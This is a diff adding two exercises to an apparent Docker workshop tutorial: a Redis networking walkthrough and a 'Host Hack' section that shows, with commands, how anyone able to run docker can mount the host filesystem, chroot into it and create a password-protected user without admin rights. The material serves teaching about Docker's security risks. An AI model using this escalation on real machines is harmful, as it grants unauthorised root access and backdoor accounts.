@@ -18,7 +18,9 @@ Before starting the exercises, make sure you have `docker` installed on your mac
   * [Multi-Stage Builds](#multi-stage-builds)
 * [Advanced Docker](#advanced-docker)
   * [Named Volumes](#named-volumes)
+  * [Docker Networking](#docker-networking)
   * [Using BuildKit](#using-buildkit)
+  * [Host Hack](#host-hack)
 
 ---
 
@@ -695,7 +697,137 @@ The data in the file was persisted!
 
 ### Docker Networking
 
-<!-- TODO(@jakob):  -->
+Docker not only manages images, containers, and volumes, but also virtual networks. These virtual
+networks are very interesting to use to isolate containers into their own network.
+
+In this exercise, deploy two containers running the `redis:6.2.6` image. Name one container `server`
+and the other `client`. Make sure both container are connected to the same network bridge, which you
+should name `my-private-network`.
+
+Once you have this setup, create an interactive shell on the `client`, and connect to the `server`
+using the CLI tool:
+
+```sh
+redis-cli -h server
+```
+
+Redis is a Key/Value store. You can set basic keys with `SET <key> <value>` and read the value back
+with `GET <key>`.
+
+<details>
+  <summary>Tip</summary>
+
+Check out `docker network --help` or `man docker-network`.
+
+</details>
+
+<details>
+  <summary>Solution</summary>
+
+Let's first create the network:
+
+```
+$ docker network create my-private-network
+fe4f86555728d6fc2b39a62143aa06fdb08f23611de1a19c6fcd94175c1d1f3f
+```
+
+We can check that it exists with `docker network list`:
+
+```
+$ docker network list
+NETWORK ID     NAME                 DRIVER    SCOPE
+b7e4034ba219   bridge               bridge    local
+8de42c477eb2   host                 host      local
+fe4f86555728   my-private-network   bridge    local
+41bbd609396e   none                 null      local
+```
+
+Then let's start the server and client:
+
+```
+$ docker run --rm -d --name server --network my-private-network redis:6.2.6
+fe786130b772d6a2e12cf893cabd347daf944f0904ddd45397a144ce2aab6d71
+
+$ docker run --rm -d --name client --network my-private-network redis:6.2.6
+26c631b2ce05e793fbc9aaf0f12797c1bb992a5a9af9449739f07607db16ecac
+```
+
+Open an interactive shell on the client, connect to the server, and play with Redis:
+
+```
+$ docker exec -it client bash
+root@26c631b2ce05:/data# redis-cli -h server
+server:6379> GET my-key
+(nil)
+server:6379> SET my-key 42
+OK
+server:6379> GET my-key
+"42"
+server:6379> 24 INCR my-key
+(integer) 43
+(integer) 44
+(integer) 45
+(integer) 46
+(integer) 47
+(integer) 48
+(integer) 49
+(integer) 50
+(integer) 51
+(integer) 52
+(integer) 53
+(integer) 54
+(integer) 55
+(integer) 56
+(integer) 57
+(integer) 58
+(integer) 59
+(integer) 60
+(integer) 61
+(integer) 62
+(integer) 63
+(integer) 64
+(integer) 65
+(integer) 66
+server:6379> GET my-key
+"66"
+server:6379>
+root@26c631b2ce05:/data# exit
+exit
+```
+
+We can check that we did indeed connect to the server, since the client has no key set:
+
+```
+$ docker exec -it client bash
+root@26c631b2ce05:/data# # connect locally by providing no hostname
+root@26c631b2ce05:/data# redis-cli
+127.0.0.1:6379> GET my-key
+(nil)
+127.0.0.1:6379>
+root@26c631b2ce05:/data# exit
+exit
+```
+
+Performing some cleanup:
+
+```
+$ docker ps
+CONTAINER ID   IMAGE         COMMAND                  CREATED         STATUS         PORTS      NAMES
+26c631b2ce05   redis:6.2.6   "docker-entrypoint.s…"   8 minutes ago   Up 8 minutes   6379/tcp   client
+fe786130b772   redis:6.2.6   "docker-entrypoint.s…"   9 minutes ago   Up 9 minutes   6379/tcp   server
+
+$ docker stop client
+client
+
+$ docker stop server
+server
+
+$ docker network rm my-private-network
+my-private-network
+```
+
+</details>
+
 
 ### Using BuildKit
 
@@ -877,5 +1009,150 @@ $ docker run --rm rusty-app:0.1.0
 
 ### Host Hack
 
-<!-- TODO(@jakob): user creation via passwd mounting  -->
+> **ATTENTION!!!** You can destroy your computer if you do not know what you are doing in this
+> exercise! Check the solution **before** executing any command you feel could be destructive. Read
+> the following very carefully.
 
+> Use the information below for educative purposes only. Misusing software (such as Docker) for
+> malicious purposes can be illegal and punishable by law.
+
+> Disclaimer: the solution below only works for Linux (and maybe MacOS). The same attack is possible
+> on Windows, but requires drastically different commands.
+
+Here we will have a short look at why Docker is quite a dangerous tool. Anyone that can run
+`docker` on your machine is essentially superuser. We will use `docker` to create a new user on the
+host machine without ever being prompted for the admin password (or any password for that matter).
+
+The feature we will be misusing here is that Docker performs no user-mapping by default on running
+containers. This means that a process in a container running as root will have UID 0 outside its
+process namespace. This is dangerous, because it means that if you manage to somehow escape the
+container isolation, the user from the container will have root access on the host.
+
+The goal of this exercise is to create a new user (`johndoe`) on your host machine without needing
+to enter any password. Have fun!
+
+<details>
+  <summary>Tip 1</summary>
+
+You are root by default in a container you run unless specified otherwise in the image declaration.
+
+</details>
+
+<details>
+  <summary>Tip 2</summary>
+
+Use a container image that uses the same distribution of your host machine.
+
+</details>
+
+<details>
+  <summary>Tip 3</summary>
+
+You can mount your entire PC into a docker container ...
+
+</details>
+
+<details>
+  <summary>Tip 4</summary>
+
+You can use `chroot` to change the root of your file system ...
+
+</details>
+
+<details>
+  <summary>Solution</summary>
+
+The general idea we want to achieve is:
+
+- Run a container with the same distro of your host. Note that it does not need to match exactly,
+  since user management is pretty standardized across all major Linux distributions (and MacOS).
+- Mount our entire PC/laptop into the container (as a volume).
+- Change the filesystem root to be the same as our laptop (with `chroot`).
+- Create the user (with `useradd` and if desired set a password with `passwd`).
+
+First let's check that the user `johndoe` does not already exist on my host machine:
+
+```
+$ cat /etc/passwd | grep johndoe
+<empty>
+```
+
+Good!
+
+The command we will use to create the user is:
+
+```
+useradd --no-log-init --no-create-home --no-user-group johndoe
+```
+
+The flags we give are simply to make the cleanup easier. Note that running this on your host will
+result in a permissions error. This is because it requires administrative rights, which we assume we
+do not have for this exercise.
+
+```
+$ whoami
+jakob
+
+$ useradd --no-log-init --no-create-home --no-user-group johndoe
+useradd: Permission denied.
+useradd: cannot lock /etc/passwd; try again later.
+```
+
+I am running Arch Linux on my host machine, so I will use this for my attack container. This would
+not be strictly necessary, but I am most familiar with it and it ensures the most consistency if I
+were to create a user I would plan to use seriously for backdoor access.
+
+Let us run the container and mount our entire machine into the container:
+
+```
+$ # pull the latest version (important since Arch is a rolling release)
+$ docker pull archlinux:latest
+$ docker run -it --rm -v /:/mnt/host archlinux:latest bash
+[root@72e75a9de4ef /]# chroot /mnt/host
+sh-5.1# useradd --no-log-init --no-create-home --no-user-group johndoe
+sh-5.1# # set a password for good measure (I used "secret" for simplicity)
+sh-5.1# passwd johndoe
+New password:
+Retype new password:
+passwd: password updated successfully
+sh-5.1# exit
+exit
+[root@72e75a9de4ef /]# exit
+exit
+```
+
+Now that we are back on our host, let's check that the user exists:
+
+```
+$ cat /etc/passwd | grep johndoe
+johndoe:x:1001:985::/home/johndoe:/bin/bash
+```
+
+Yup, we just created a user without requiring admin privileges...
+
+Let's try to login as that user (use the password you set above, if you did set one):
+
+```
+$ su johndoe
+Password:
+[johndoe@revenge-xps viscon-workshop-04-2022]$ whoami
+johndoe
+[johndoe@revenge-xps viscon-workshop-04-2022]$ exit
+exit
+```
+
+And perform cleanup on your host machine:
+
+```
+$ sudo userdel -r johndoe
+userdel: johndoe mail spool (/var/spool/mail/johndoe) not found
+userdel: johndoe home directory (/home/johndoe) not found
+
+$ cat /etc/passwd | grep johndoe
+<empty>
+```
+
+I seriously hope it scared you a little how easy it is to essentially do whatever you want on any
+machine on which you have permissions to run `docker`...
+
+</details>
